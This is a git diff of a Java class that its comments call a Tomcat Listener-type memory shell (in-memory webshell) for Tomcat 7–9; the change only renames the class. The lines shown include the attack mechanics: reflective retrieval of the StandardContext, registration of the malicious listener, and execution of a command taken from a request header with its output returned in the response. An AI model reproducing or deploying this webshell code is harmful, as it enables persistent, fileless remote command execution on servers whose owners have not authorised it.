@@ -17,11 +17,11 @@ import java.lang.reflect.Field;
  * Thread 获取上下文注入 Tomcat Listener 型内存马
  * Tomcat 7 8 9
  */
-public class TLMSThread implements ServletRequestListener {
+public class TomcatListenerThreadMS implements ServletRequestListener {
     private static HttpServletRequest request;
     private static HttpServletResponse response;
 
-    public TLMSThread() {
+    public TomcatListenerThreadMS() {
 
     }
 
@@ -72,7 +72,7 @@ public class TLMSThread implements ServletRequestListener {
             } catch (NoSuchMethodException e) {
                 standardContext = (StandardContext) getFieldValue(request, "context");
             }
-            TLMSThread listenerMemShell = new TLMSThread();
+            TomcatListenerThreadMS listenerMemShell = new TomcatListenerThreadMS();
             standardContext.addApplicationEventListener(listenerMemShell);
 
 
@@ -97,7 +97,7 @@ public class TLMSThread implements ServletRequestListener {
             String result = exec(header);
             org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) getFieldValue(httpServletRequest, "request");
             PrintWriter printWriter = request.getResponse().getWriter();
-            printWriter.println("TLMSThread injected");
+            printWriter.println("TomcatListenerThreadMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
